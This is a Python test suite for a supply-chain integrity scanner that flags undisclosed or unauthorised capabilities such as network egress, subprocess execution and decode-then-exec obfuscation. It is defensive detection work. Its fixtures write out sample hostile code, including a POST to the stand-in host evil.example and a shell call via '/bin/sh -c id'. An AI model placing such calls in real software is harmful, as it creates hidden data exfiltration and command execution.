# CUI // SP-CTI
"""Tests for the SIPA intent reconciler — Mode B (sipa-intent-02).

Covers the acceptance criteria for ``tools/integrity/intent_reconciler.py``:

  * ``reconcile_blind(manifest, claim)`` -> ``integrity_findings``-shaped dicts.
  * **Undisclosed pass:** every capability in the exercised manifest that the
    parsed claim does not imply becomes an ``undisclosed_capability`` finding,
    severity derived from ``constants.RISK_WEIGHTS_CAPABILITY`` (network_egress ->
    high, process_exec / dynamic_code -> critical).
  * **The task's anchor case:** a "JSON formatter" whose manifest has
    ``network_egress`` yields ``undisclosed_capability(network_egress, high)``.
  * **Intrinsic-risk pass:** ``dynamic_code`` + ``obfuscation`` together is
    ``critical`` regardless of what the claim discloses.
  * A claim that covers the exercised behavior yields no undisclosed finding.

Pure-Python; no DB / network / subprocess (the persistence path is exercised
separately against an in-memory SQLite connection).
"""
import pytest

from tools.integrity import constants
from tools.integrity import intent_reconciler as ir


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def _cap(cap_type, file_path="mod.py", line=1, **evidence):
    """Build a capability record like capability_extractor.extract emits."""
    return {
        "file_path": file_path,
        "function_name": None,
        "capability_type": cap_type,
        "evidence": dict(evidence),
        "line_start": line,
        "line_end": line,
        "risk_weight": constants.RISK_WEIGHTS_CAPABILITY.get(cap_type, 0.0),
    }


def _by_type(findings, finding_type):
    return [f for f in findings if f["finding_type"] == finding_type]


# --------------------------------------------------------------------------- #
# Anchor case — a "JSON formatter" whose manifest has network_egress
# --------------------------------------------------------------------------- #
def test_json_formatter_with_network_egress_is_undisclosed_high():
    manifest = [_cap("network_egress", api="requests.post", url="https://evil.example")]
    # README claims only JSON formatting -> no network claim.
    claim = {"claimed_capabilities": set()}

    findings = ir.reconcile_blind(manifest, claim)
    undisclosed = _by_type(findings, "undisclosed_capability")

    assert len(undisclosed) == 1
    f = undisclosed[0]
    assert f["detail"]["capability_type"] == "network_egress"
    assert f["severity"] == "high"
    assert f["source_scanner"] == ir.SOURCE_SCANNER
    assert f["finding_type"] in constants.FINDING_TYPES
    assert f["severity"] in constants.SEVERITY


# --------------------------------------------------------------------------- #
# Severity derivation from RISK_WEIGHTS
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "cap_type, expected",
    [
        ("dynamic_code", "critical"),   # weight 1.00
        ("process_exec", "critical"),   # weight 0.95
        ("network_egress", "high"),     # weight 0.90
        ("env_secret", "high"),         # weight 0.85
        ("serialization", "high"),      # weight 0.80
        ("filesystem", "medium"),       # weight 0.70
        ("crypto", "low"),              # weight 0.40
    ],
)
def test_undisclosed_severity_tracks_risk_weight(cap_type, expected):
    findings = ir.reconcile_blind([_cap(cap_type)], claim=set())
    undisclosed = _by_type(findings, "undisclosed_capability")
    assert undisclosed and undisclosed[0]["severity"] == expected


# --------------------------------------------------------------------------- #
# A claim that covers the behavior -> no undisclosed finding
# --------------------------------------------------------------------------- #
def test_claimed_capability_is_not_flagged():
    manifest = [_cap("network_egress")]
    claim = {"claimed_capabilities": {"network_egress"}}
    findings = ir.reconcile_blind(manifest, claim)
    assert _by_type(findings, "undisclosed_capability") == []


def test_partial_claim_flags_only_the_gap():
    manifest = [_cap("network_egress"), _cap("process_exec"), _cap("filesystem")]
    claim = {"claimed_capabilities": {"network_egress"}}
    findings = ir.reconcile_blind(manifest, claim)
    flagged = {f["detail"]["capability_type"] for f in _by_type(findings, "undisclosed_capability")}
    assert flagged == {"process_exec", "filesystem"}


# --------------------------------------------------------------------------- #
# Grouping — multiple sites of one capability in a file collapse to one finding
# --------------------------------------------------------------------------- #
def test_multiple_sites_collapse_per_file_capability():
    manifest = [
        _cap("network_egress", file_path="a.py", line=10),
        _cap("network_egress", file_path="a.py", line=20),
        _cap("network_egress", file_path="b.py", line=5),
    ]
    findings = _by_type(ir.reconcile_blind(manifest, set()), "undisclosed_capability")
    # One finding per (file, capability): a.py + b.py.
    assert len(findings) == 2
    a = next(f for f in findings if f["file_path"] == "a.py")
    assert a["detail"]["occurrences"] == 2
    assert a["line"] == 10  # anchored at the earliest site


# --------------------------------------------------------------------------- #
# Intrinsic-risk pass — dynamic_code + obfuscation => critical, regardless of claim
# --------------------------------------------------------------------------- #
def test_dynamic_code_plus_obfuscation_is_intrinsic_critical():
    manifest = [
        _cap("dynamic_code", file_path="x.py", line=3, api="exec"),
        _cap("obfuscation", file_path="x.py", line=2, api="base64.b64decode"),
    ]
    # Even if BOTH are disclosed, the combination is still flagged.
    claim = {"claimed_capabilities": {"dynamic_code", "obfuscation"}}
    findings = ir.reconcile_blind(manifest, claim)

    intrinsic = _by_type(findings, "dangerous_api")
    assert len(intrinsic) == 1
    f = intrinsic[0]
    assert f["severity"] == "critical"
    assert f["detail"]["rule"] == "dynamic_code+obfuscation"
    assert f["file_path"] == "x.py"


def test_obfuscated_input_taint_alone_is_intrinsic_critical():
    # exec(payload) where payload = b64decode(...) -> extractor sets obfuscated_input.
    manifest = [_cap("dynamic_code", file_path="x.py", line=9, api="exec", obfuscated_input=True)]
    findings = ir.reconcile_blind(manifest, claim=set())
    intrinsic = _by_type(findings, "dangerous_api")
    assert len(intrinsic) == 1
    assert intrinsic[0]["severity"] == "critical"
    assert "dynamic_code(obfuscated_input)" in intrinsic[0]["detail"]["signals"]


def test_dynamic_code_without_obfuscation_no_intrinsic_finding():
    manifest = [_cap("dynamic_code", file_path="x.py")]
    findings = ir.reconcile_blind(manifest, claim={"claimed_capabilities": {"dynamic_code"}})
    # Disclosed dynamic_code on its own -> no undisclosed, no intrinsic.
    assert _by_type(findings, "dangerous_api") == []
    assert _by_type(findings, "undisclosed_capability") == []


def test_intrinsic_fires_per_file_once():
    manifest = [
        _cap("dynamic_code", file_path="x.py", line=3),
        _cap("obfuscation", file_path="x.py", line=2),
        _cap("dynamic_code", file_path="x.py", line=7),
    ]
    intrinsic = _by_type(ir.reconcile_blind(manifest, set()), "dangerous_api")
    assert len(intrinsic) == 1


# --------------------------------------------------------------------------- #
# Input normalization — bare string sets and parse_claim dicts both work
# --------------------------------------------------------------------------- #
def test_manifest_accepts_bare_capability_strings():
    findings = ir.reconcile_blind(["network_egress", "process_exec"], claim=set())
    flagged = {f["detail"]["capability_type"] for f in _by_type(findings, "undisclosed_capability")}
    assert flagged == {"network_egress", "process_exec"}


def test_claim_accepts_set_or_parse_claim_dict():
    manifest = [_cap("network_egress")]
    assert ir.reconcile_blind(manifest, {"network_egress"}) == []  # set form covers it
    assert ir.reconcile_blind(manifest, {"claimed_capabilities": {"network_egress"}}) == []


def test_none_claim_treats_everything_as_undisclosed():
    manifest = [_cap("filesystem")]
    findings = _by_type(ir.reconcile_blind(manifest, None), "undisclosed_capability")
    assert len(findings) == 1


# --------------------------------------------------------------------------- #
# assess_blind end-to-end over a real file tree (no persistence)
# --------------------------------------------------------------------------- #
def test_assess_blind_end_to_end_flags_undisclosed_network(tmp_path):
    (tmp_path / "README.md").write_text("# jsonfmt\n\nFormats JSON files.\n", encoding="utf-8")
    (tmp_path / "tool.py").write_text(
        '"""Formats JSON."""\n'
        "import requests\n\n"
        "def go():\n"
        "    requests.post('https://evil.example', json={})\n",
        encoding="utf-8",
    )
    result = ir.assess_blind(str(tmp_path))

    assert "network_egress" in result["exercised_capabilities"]
    assert "network_egress" not in result["claimed_capabilities"]
    undisclosed = _by_type(result["findings"], "undisclosed_capability")
    assert any(
        f["detail"]["capability_type"] == "network_egress" and f["severity"] == "high"
        for f in undisclosed
    )


# --------------------------------------------------------------------------- #
# Persistence — append-only to integrity_findings (in-memory SQLite)
# --------------------------------------------------------------------------- #
def test_reconcile_and_persist_writes_findings(tmp_path, monkeypatch):
    import sqlite3

    from tools.integrity.db import init_db as init_db_mod

    conn = sqlite3.connect(":memory:")
    init_db_mod.init_db(conn)

    # Seed a parent assessment row so the FK (if enforced) is satisfied.
    try:
        conn.execute(
            "INSERT INTO integrity_assessments "
            "(id, source, source_type, assess_mode, status, tenant_id, classification) "
            "VALUES (1, ?, 'local', 'provenance_blind', 'quarantine', NULL, NULL)",
            (str(tmp_path),),
        )
        conn.commit()
    except sqlite3.OperationalError:
        pass  # schema variant without these columns — the findings INSERT is what we test

    manifest = [_cap("network_egress"), _cap("process_exec")]
    result = ir.reconcile_and_persist(1, manifest, claim=set(), conn=conn)

    assert result["findings_persisted"] == 2
    rows = conn.execute(
        "SELECT source_scanner, finding_type, severity FROM integrity_findings "
        "WHERE assessment_id = 1 ORDER BY id"
    ).fetchall()
    assert len(rows) == 2
    assert all(r[0] == "reconciliation" and r[1] == "undisclosed_capability" for r in rows)
    conn.close()


# --------------------------------------------------------------------------- #
# Output shape is exactly the scanner-adapter integrity_findings shape
# --------------------------------------------------------------------------- #
def test_finding_shape_matches_integrity_findings_contract():
    findings = ir.reconcile_blind([_cap("network_egress")], set())
    for f in findings:
        assert set(f) == {"source_scanner", "finding_type", "severity", "file_path", "line", "detail"}
        assert f["finding_type"] in constants.FINDING_TYPES
        assert f["source_scanner"] in constants.FINDING_SCANNERS
        assert f["severity"] in constants.SEVERITY
        assert isinstance(f["detail"], dict)


# =========================================================================== #
# Mode A — provenance-aware reconciliation (sipa-intent-03)
#
# RTM-derived ALLOWED-capability set vs. exercised manifest. A capability the
# code exercises that NO intake requirement authorizes is the semantic-backdoor
# case -> unauthorized_capability. Requirements with no implementing code are
# surfaced as coverage gaps (best-effort RTM build, mocked here).
# =========================================================================== #
import sqlite3  # noqa: E402

from tools.integrity.db import init_db as _init_db_mod  # noqa: E402


# Minimal intake_requirements table — init_db (integrity) does not create it, so
# the Mode A requirement read is exercised against a seeded in-memory copy.
_INTAKE_DDL = """
CREATE TABLE IF NOT EXISTS intake_requirements (
    id              TEXT PRIMARY KEY,
    session_id      TEXT,
    project_id      TEXT,
    raw_text        TEXT,
    requirement_type TEXT,
    priority        TEXT,
    status          TEXT
)
"""


def _aware_conn(requirements):
    """In-memory SQLite with integrity tables + a seeded intake_requirements set.

    ``requirements`` is an iterable of ``(req_id, raw_text[, session_id])`` tuples
    under project ``proj-A``.
    """
    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    _init_db_mod.init_db(conn)
    conn.execute(_INTAKE_DDL)
    for row in requirements:
        req_id, text = row[0], row[1]
        session_id = row[2] if len(row) > 2 else "sess-1"
        conn.execute(
            "INSERT INTO intake_requirements (id, session_id, project_id, raw_text) "
            "VALUES (?, ?, 'proj-A', ?)",
            (req_id, session_id, text),
        )
    conn.commit()
    return conn


@pytest.fixture(autouse=True)
def _no_real_rtm(monkeypatch):
    """Default: stub the coverage-gap RTM build so Mode A tests never hit the real DB.

    Individual tests override ``ir._coverage_gaps`` when they want to assert gap
    surfacing; this autouse default keeps every other Mode A test off the disk DB.
    """
    monkeypatch.setattr(ir, "_coverage_gaps", lambda *a, **k: [])


# --------------------------------------------------------------------------- #
# Acceptance: a capability with no authorizing requirement => unauthorized
# --------------------------------------------------------------------------- #
def test_capability_with_no_requirement_is_unauthorized():
    # A requirement authorizes ONLY network egress ("notify by email"); the code
    # also spawns a subprocess, which no requirement authorizes -> unauthorized.
    conn = _aware_conn([("req-1", "The system shall notify the operator by email.")])
    manifest = [
        _cap("network_egress", file_path="app.py", line=10),
        _cap("process_exec", file_path="app.py", line=20),
    ]
    result = ir.reconcile_aware(manifest, "proj-A", session_id="sess-1", conn=conn)
    conn.close()

    unauthorized = _by_type(result["findings"], "unauthorized_capability")
    flagged = {f["detail"]["capability_type"] for f in unauthorized}
    assert flagged == {"process_exec"}  # network_egress was authorized, process_exec was not

    f = unauthorized[0]
    assert f["finding_type"] == "unauthorized_capability"
    assert f["finding_type"] in constants.FINDING_TYPES
    assert f["severity"] == "critical"  # process_exec weight 0.95
    assert f["source_scanner"] == ir.SOURCE_SCANNER
    assert "network_egress" in result["allowed_capabilities"]


def test_lexicon_authorizes_capability_same_as_claim_parser():
    # "notify by email" implies network_egress under the shared lexicon, so it is
    # authorized and not flagged even though the code exercises it.
    conn = _aware_conn([("req-1", "Notify stakeholders by email when a job completes.")])
    result = ir.reconcile_aware([_cap("network_egress")], "proj-A", conn=conn)
    conn.close()
    assert _by_type(result["findings"], "unauthorized_capability") == []
    assert "network_egress" in result["allowed_capabilities"]


def test_no_requirements_means_nothing_authorized():
    # Project with zero requirements -> every exercised capability is unauthorized.
    # NB: deliberately does NOT use "crypto" — that type is suppressed platform-wide
    # by platform_authorized_capabilities (REQ-PLATFORM-CRYPTO-FINGERPRINT-01), so
    # it would never be flagged here regardless of requirements. See
    # test_platform_authorized_capability_suppressed_without_requirements below.
    conn = _aware_conn([])
    manifest = [_cap("filesystem"), _cap("network_egress")]
    result = ir.reconcile_aware(manifest, "proj-A", conn=conn)
    conn.close()
    flagged = {f["detail"]["capability_type"] for f in _by_type(result["findings"], "unauthorized_capability")}
    assert flagged == {"filesystem", "network_egress"}


def test_platform_authorized_capability_suppressed_without_requirements():
    """``crypto`` is authorized platform-wide, so zero requirements still clears it.

    args/integrity_config.yaml::platform_authorized_capabilities carves out
    ``crypto`` under REQ-PLATFORM-CRYPTO-FINGERPRINT-01: hashlib is used across
    the tools/ tree for non-keyed content fingerprinting, not for encryption or
    key derivation. Capabilities outside that carve-out are still flagged.
    """
    assert "crypto" in ir._load_platform_authorized_capabilities()

    conn = _aware_conn([])
    result = ir.reconcile_aware([_cap("crypto"), _cap("filesystem")], "proj-A", conn=conn)
    conn.close()
    flagged = {f["detail"]["capability_type"] for f in _by_type(result["findings"], "unauthorized_capability")}
    assert flagged == {"filesystem"}, "crypto must be suppressed, filesystem must not"


def test_unauthorized_sites_collapse_per_file_capability():
    conn = _aware_conn([("req-1", "Formats JSON files.")])  # authorizes nothing risky
    manifest = [
        _cap("network_egress", file_path="a.py", line=30),
        _cap("network_egress", file_path="a.py", line=12),
        _cap("network_egress", file_path="b.py", line=5),
    ]
    result = ir.reconcile_aware(manifest, "proj-A", conn=conn)
    conn.close()
    findings = _by_type(result["findings"], "unauthorized_capability")
    assert len(findings) == 2  # one per (file, capability)
    a = next(f for f in findings if f["file_path"] == "a.py")
    assert a["detail"]["occurrences"] == 2
    assert a["line"] == 12  # earliest site


def test_aware_intrinsic_risk_fires_even_when_authorized():
    # A requirement explicitly authorizes dynamic code + obfuscation, yet the
    # decode-then-exec shape is still flagged critical (dangerous regardless).
    conn = _aware_conn(
        [("req-1", "Uses eval for plugins and base64 to pack payloads.")]
    )
    manifest = [
        _cap("dynamic_code", file_path="x.py", line=3, api="exec"),
        _cap("obfuscation", file_path="x.py", line=2, api="base64.b64decode"),
    ]
    result = ir.reconcile_aware(manifest, "proj-A", conn=conn)
    conn.close()
    intrinsic = _by_type(result["findings"], "dangerous_api")
    assert len(intrinsic) == 1
    assert intrinsic[0]["severity"] == "critical"


def test_aware_exercised_and_allowed_sets_surfaced():
    conn = _aware_conn([("req-1", "Encrypts files at rest and writes them to disk.")])
    manifest = [_cap("crypto"), _cap("filesystem"), _cap("network_egress")]
    result = ir.reconcile_aware(manifest, "proj-A", conn=conn)
    conn.close()
    assert result["mode"] == "provenance_aware"
    assert result["exercised_capabilities"] == ["crypto", "filesystem", "network_egress"]
    # crypto + filesystem authorized; network_egress is the unauthorized gap.
    assert set(result["allowed_capabilities"]) >= {"crypto", "filesystem"}
    flagged = {f["detail"]["capability_type"] for f in _by_type(result["findings"], "unauthorized_capability")}
    assert flagged == {"network_egress"}


def test_coverage_gaps_surface_requirements_with_no_code(monkeypatch):
    # Override the autouse stub: simulate an RTM gap where a requirement has no
    # implementing code module.
    monkeypatch.setattr(
        ir,
        "_coverage_gaps",
        lambda *a, **k: [
            {
                "requirement_id": "req-9",
                "requirement_text": "Shall export an audit report.",
                "missing_links": ["code_modules", "test_files"],
                "severity": "medium",
                "coverage_pct": 40.0,
            }
        ],
    )
    conn = _aware_conn([("req-1", "Formats JSON.")])
    result = ir.reconcile_aware([_cap("filesystem")], "proj-A", conn=conn)
    conn.close()
    assert len(result["coverage_gaps"]) == 1
    assert result["coverage_gaps"][0]["requirement_id"] == "req-9"
    assert "code_modules" in result["coverage_gaps"][0]["missing_links"]


def test_missing_intake_table_degrades_to_nothing_authorized():
    # A bare integrity DB (no intake_requirements table) must not raise: the read
    # is guarded and everything exercised becomes unauthorized.
    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    _init_db_mod.init_db(conn)
    result = ir.reconcile_aware([_cap("network_egress")], "proj-A", conn=conn)
    conn.close()
    flagged = {f["detail"]["capability_type"] for f in _by_type(result["findings"], "unauthorized_capability")}
    assert flagged == {"network_egress"}


# --------------------------------------------------------------------------- #
# Mode A persistence — append-only to integrity_findings
# --------------------------------------------------------------------------- #
def test_reconcile_aware_and_persist_writes_unauthorized_findings(tmp_path):
    conn = _aware_conn([("req-1", "Notify by email on completion.")])
    try:
        conn.execute(
            "INSERT INTO integrity_assessments "
            "(id, source, source_type, assess_mode, status, tenant_id, classification) "
            "VALUES (7, ?, 'local', 'provenance_aware', 'quarantine', NULL, NULL)",
            (str(tmp_path),),
        )
        conn.commit()
    except sqlite3.OperationalError:
        pass

    manifest = [_cap("network_egress"), _cap("process_exec"), _cap("filesystem")]
    result = ir.reconcile_aware_and_persist(7, manifest, "proj-A", conn=conn)

    # network_egress authorized; process_exec + filesystem unauthorized -> 2 rows.
    assert result["findings_persisted"] == 2
    assert result["mode"] == "provenance_aware"
    rows = conn.execute(
        "SELECT source_scanner, finding_type FROM integrity_findings "
        "WHERE assessment_id = 7 ORDER BY id"
    ).fetchall()
    conn.close()
    assert len(rows) == 2
    assert all(r[0] == "reconciliation" and r[1] == "unauthorized_capability" for r in rows)


def test_aware_finding_shape_matches_contract():
    conn = _aware_conn([("req-1", "Formats JSON.")])
    result = ir.reconcile_aware([_cap("network_egress"), _cap("process_exec")], "proj-A", conn=conn)
    conn.close()
    for f in result["findings"]:
        assert set(f) == {"source_scanner", "finding_type", "severity", "file_path", "line", "detail"}
        assert f["finding_type"] in constants.FINDING_TYPES
        assert f["source_scanner"] in constants.FINDING_SCANNERS
        assert f["severity"] in constants.SEVERITY
        assert isinstance(f["detail"], dict)


def test_assess_aware_end_to_end_flags_unauthorized_subprocess(tmp_path):
    # A real source tree exercising network egress (authorized) + subprocess
    # (unauthorized). assess_aware extracts the manifest from disk and reconciles
    # it against the seeded RTM requirements.
    (tmp_path / "agent.py").write_text(
        '"""Agent."""\n'
        "import requests\n"
        "import subprocess\n\n"
        "def go():\n"
        "    requests.post('https://hub.example/telemetry', json={})\n"
        "    subprocess.call(['/bin/sh', '-c', 'id'])\n",
        encoding="utf-8",
    )
    conn = _aware_conn([("req-1", "Send telemetry to the remote server.")])
    result = ir.assess_aware(str(tmp_path), "proj-A", session_id="sess-1", conn=conn)
    conn.close()

    assert result["mode"] == "provenance_aware"
    assert "network_egress" in result["exercised_capabilities"]
    assert "process_exec" in result["exercised_capabilities"]
    flagged = {
        f["detail"]["capability_type"]
        for f in _by_type(result["findings"], "unauthorized_capability")
    }
    assert "process_exec" in flagged          # no requirement authorizes subprocess
    assert "network_egress" not in flagged    # telemetry requirement authorizes egress


# =========================================================================== #
# Optional LLM-assisted second opinion (sipa-intent-04)
#
# The deterministic rule-based reconciliation ALWAYS computes first and is the
# fallback. The LLM pass is purely advisory: gated on integrity_config.yaml
# llm_assist.enabled AND a reachable provider; any failure degrades silently to
# deterministic-only. None of these tests touch a real LLM provider.
# =========================================================================== #
class _FakeResponse:
    def __init__(self, structured_output=None, content=""):
        self.structured_output = structured_output
        self.content = content


class _FakeRouter:
    """Stand-in LLMRouter: records the invoked function and returns a canned reply."""

    def __init__(self, response, no_llm=False):
        self._response = response
        self._no_llm = no_llm
        self.invoked_function = None

    def is_no_llm_mode(self):
        return self._no_llm

    def invoke(self, function, request):
        self.invoked_function = function
        if isinstance(self._response, Exception):
            raise self._response
        return self._response


def _enabled_cfg(function_key="intent_reconciliation"):
    return {"llm_assist": {"enabled": True, "function_key": function_key}}


def _disabled_cfg():
    return {"llm_assist": {"enabled": False, "function_key": "intent_reconciliation"}}


# --------------------------------------------------------------------------- #
# Acceptance: with LLM disabled the deterministic path still produces a verdict.
# --------------------------------------------------------------------------- #
def test_disabled_llm_assist_yields_no_advisory_but_deterministic_findings():
    summary = ir._manifest_summary([_cap("network_egress")])
    assert ir.llm_second_opinion("claim", summary, config=_disabled_cfg()) is None


def test_assess_blind_disabled_assist_still_flags_deterministically(tmp_path, monkeypatch):
    # Force config to disabled regardless of the on-disk integrity_config.yaml.
    monkeypatch.setattr(ir, "_load_config", lambda: _disabled_cfg())
    (tmp_path / "README.md").write_text("# jsonfmt\nFormats JSON.\n", encoding="utf-8")
    (tmp_path / "tool.py").write_text(
        '"""Formats JSON."""\nimport requests\n\n'
        "def go():\n    requests.post('https://evil.example', json={})\n",
        encoding="utf-8",
    )
    result = ir.assess_blind(str(tmp_path))

    # Deterministic verdict is intact, and the advisory key is present but empty.
    undisclosed = _by_type(result["findings"], "undisclosed_capability")
    assert any(f["detail"]["capability_type"] == "network_egress" for f in undisclosed)
    assert result["llm_advisory"] is None


def test_reconcile_aware_disabled_assist_attaches_none(monkeypatch):
    monkeypatch.setattr(ir, "_load_config", lambda: _disabled_cfg())
    conn = _aware_conn([("req-1", "Formats JSON.")])
    result = ir.reconcile_aware([_cap("network_egress")], "proj-A", conn=conn)
    conn.close()
    assert result["llm_advisory"] is None
    # Deterministic finding still present.
    assert _by_type(result["findings"], "unauthorized_capability")


# --------------------------------------------------------------------------- #
# Enabled + reachable provider: advisory match / mismatch verdict surfaces.
# --------------------------------------------------------------------------- #
def test_llm_second_opinion_mismatch_via_structured_output():
    router = _FakeRouter(
        _FakeResponse(structured_output={
            "judgement": "mismatch",
            "rationale": "A JSON formatter should not open sockets.",
            "confidence": 0.9,
        })
    )
    advisory = ir.llm_second_opinion(
        "Formats JSON files.",
        ir._manifest_summary([_cap("network_egress")]),
        config=_enabled_cfg(),
        router=router,
    )
    assert advisory is not None
    assert advisory["judgement"] == "mismatch"
    assert advisory["advisory"] is True
    assert advisory["source"] == "llm"
    assert advisory["confidence"] == 0.9
    # Routed through the configured function key.
    assert router.invoked_function == "intent_reconciliation"


def test_llm_second_opinion_match_via_json_content_fallback():
    # No structured_output — parsed from the content string instead.
    router = _FakeRouter(
        _FakeResponse(content='{"judgement": "match", "rationale": "ok", "confidence": 0.7}')
    )
    advisory = ir.llm_second_opinion(
        "Sends telemetry over the network.",
        ir._manifest_summary([_cap("network_egress")]),
        config=_enabled_cfg(),
        router=router,
    )
    assert advisory and advisory["judgement"] == "match"


def test_custom_function_key_is_used():
    router = _FakeRouter(_FakeResponse(structured_output={"judgement": "match", "rationale": "x"}))
    ir.llm_second_opinion(
        "claim", ir._manifest_summary([_cap("crypto")]),
        config=_enabled_cfg(function_key="custom_intent_fn"), router=router,
    )
    assert router.invoked_function == "custom_intent_fn"


def test_assess_blind_enabled_attaches_advisory(tmp_path, monkeypatch):
    monkeypatch.setattr(ir, "_load_config", lambda: _enabled_cfg())
    router = _FakeRouter(_FakeResponse(structured_output={
        "judgement": "mismatch", "rationale": "undisclosed egress", "confidence": 0.8,
    }))
    (tmp_path / "tool.py").write_text(
        '"""Formats JSON."""\nimport requests\n\n'
        "def go():\n    requests.post('https://evil.example', json={})\n",
        encoding="utf-8",
    )
    result = ir.assess_blind(str(tmp_path), llm_router=router)
    assert result["llm_advisory"]["judgement"] == "mismatch"
    # Deterministic findings are still the primary verdict.
    assert _by_type(result["findings"], "undisclosed_capability")


# --------------------------------------------------------------------------- #
# Degradation: no-LLM mode, malformed verdict, and provider errors -> None.
# --------------------------------------------------------------------------- #
def test_no_llm_mode_short_circuits_to_none():
    router = _FakeRouter(_FakeResponse(structured_output={"judgement": "match", "rationale": "x"}), no_llm=True)
    advisory = ir.llm_second_opinion(
        "claim", ir._manifest_summary([_cap("crypto")]), config=_enabled_cfg(), router=router,
    )
    assert advisory is None
    assert router.invoked_function is None  # never invoked under no-LLM mode


def test_provider_error_degrades_to_none():
    router = _FakeRouter(RuntimeError("no provider in chain"))
    advisory = ir.llm_second_opinion(
        "claim", ir._manifest_summary([_cap("crypto")]), config=_enabled_cfg(), router=router,
    )
    assert advisory is None


def test_invalid_judgement_value_degrades_to_none():
    router = _FakeRouter(_FakeResponse(structured_output={"judgement": "maybe", "rationale": "x"}))
    advisory = ir.llm_second_opinion(
        "claim", ir._manifest_summary([_cap("crypto")]), config=_enabled_cfg(), router=router,
    )
    assert advisory is None


def test_unparseable_content_degrades_to_none():
    router = _FakeRouter(_FakeResponse(content="not json at all"))
    advisory = ir.llm_second_opinion(
        "claim", ir._manifest_summary([_cap("crypto")]), config=_enabled_cfg(), router=router,
    )
    assert advisory is None


# --------------------------------------------------------------------------- #
# Manifest summary helper — compact, no source code, deterministic ordering.
# --------------------------------------------------------------------------- #
def test_manifest_summary_is_compact_and_sorted():
    summary = ir._manifest_summary([
        _cap("network_egress", file_path="a.py"),
        _cap("network_egress", file_path="a.py"),
        _cap("crypto", file_path="b.py"),
    ])
    assert summary["exercised_capabilities"] == ["crypto", "network_egress"]
    assert summary["by_capability"]["network_egress"] == 2
    assert set(summary["files"]) == {"a.py", "b.py"}
